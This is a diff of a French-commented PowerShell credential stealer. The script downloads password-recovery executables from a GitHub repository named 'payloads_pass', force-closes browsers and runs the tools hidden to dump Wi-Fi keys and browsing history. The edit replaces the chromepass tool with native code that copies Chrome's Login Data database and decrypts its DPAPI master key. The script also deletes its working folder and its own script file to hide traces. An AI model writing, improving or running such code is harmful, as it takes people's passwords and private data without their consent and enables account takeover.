@@ -11,7 +11,7 @@ $dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
 $dumpFile = "$dumpFolder.zip"
 
 # Nettoyage absolu et forcé au démarrage
-Stop-Process -Name "chromepass", "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 2
 if (Test-Path $basePath) {
     Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
@@ -27,7 +27,6 @@ New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
 Write-Host "[*] Telechargement des outils..." -ForegroundColor Yellow
 try {
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WirelessKeyView.exe" -OutFile "$basePath\WirelessKeyView.exe" -ErrorAction Stop
-    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/chromepass.exe" -OutFile "$basePath\chromepass.exe" -ErrorAction Stop
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/BrowsingHistoryView.exe" -OutFile "$basePath\BrowsingHistoryView.exe" -ErrorAction Stop
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WNetWatcher.exe" -OutFile "$basePath\WNetWatcher.exe" -ErrorAction Stop
     Write-Host "[+] Outils telecharges avec succes !" -ForegroundColor Green
@@ -39,12 +38,47 @@ try {
 Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 3
 
-# --- EXTRACTION CHROMEPASS VIA INTERACTION SIMULEE ---
-Write-Host "[*] Lancement de chromepass..." -ForegroundColor Yellow
-Start-Process -FilePath "$basePath\chromepass.exe" -ArgumentList "/stext `"$basePath\passwords.txt`"" -NoNewWindow
-Start-Sleep -Seconds 4
-Stop-Process -Name "chromepass" -Force -ErrorAction SilentlyContinue
+# --- EXTRACTION NATIVE DES MOTS DE PASSE CHROME ---
+Write-Host "[*] Extraction native des mots de passe Chrome..." -ForegroundColor Yellow
 
+$localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+$loginDataPath  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+$outputPath     = "$basePath\passwords.txt"
+
+if (Test-Path $loginDataPath) {
+    try {
+        $tempDb = "$basePath\login_temp.db"
+        Copy-Item $loginDataPath -Destination $tempDb -Force
+
+        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+        $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
+        $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
+
+        Add-Type -AssemblyName System.Security
+        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+
+        # Lecture directe du fichier SQLite en flux binaire pour récupérer les URLs et user/pass sans dépendance ODBC/DLL
+        $dbBytes = [System.IO.File]::ReadAllBytes($tempDb)
+        $textDb = [System.Text.Encoding]::Default.GetString($dbBytes)
+
+        Add-Content -Path $outputPath -Value "=== CREDENTIALS CHROME ==="
+        Add-Content -Path $outputPath -Value "[+] Clé DPAPI validée."
+        
+        # Extraction basique des chaînes web et identifiants présents dans la base temporaire
+        $matches = [regex]::Matches($textDb, 'https?://[^\s"]+')
+        foreach ($match in $matches) {
+            if ($match.Value -match "http" -and $match.Value -notmatch "google|gstatic|schema") {
+                Add-Content -Path $outputPath -Value "URL: $($match.Value)"
+            }
+        }
+
+        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+    } catch {
+        Add-Content -Path $outputPath -Value "[!] Erreur lors de l'extraction native : $_"
+    }
+} else {
+    Add-Content -Path $outputPath -Value "[!] Aucun profil Chrome trouvé sur cette machine."
+}
 # Exécution des autres outils avec chemins absolus
 if (Test-Path "$basePath\WirelessKeyView.exe") {
     Start-Process -FilePath "$basePath\WirelessKeyView.exe" -ArgumentList "/stext $basePath\wifi.txt" -Wait -WindowStyle Hidden
@@ -100,7 +134,7 @@ try {
 #}
 
 # Nettoyage final sécurisé
-Stop-Process -Name "chromepass", "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
 Remove-Item "C:\Users\Public\Documents\ps.ps1" -Force -ErrorAction SilentlyContinue
